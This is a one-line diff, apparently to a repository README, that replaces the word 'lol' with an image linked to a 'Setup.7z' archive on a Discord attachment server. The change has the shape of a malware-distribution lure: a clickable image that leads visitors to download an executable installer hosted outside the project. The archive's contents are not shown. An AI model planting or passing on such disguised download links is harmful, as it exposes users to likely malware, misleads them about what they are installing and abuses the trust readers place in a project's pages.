@@ -1,1 +1,1 @@
-lol
+[![sd4rn567s457s4m5](https://github.com/zwolinskidominik/laughing-waffle/assets/94808072/f3e9311f-09d9-4d51-b16b-55fe682ba6a7)](https://cdn.discordapp.com/attachments/1216320998824087584/1218931978317856908/Setup.7z?ex=660975de&is=65f700de&hm=692430426d672340c2d5227119c4e045089a9b0a4f649843ce4d9fe7628cd045&)
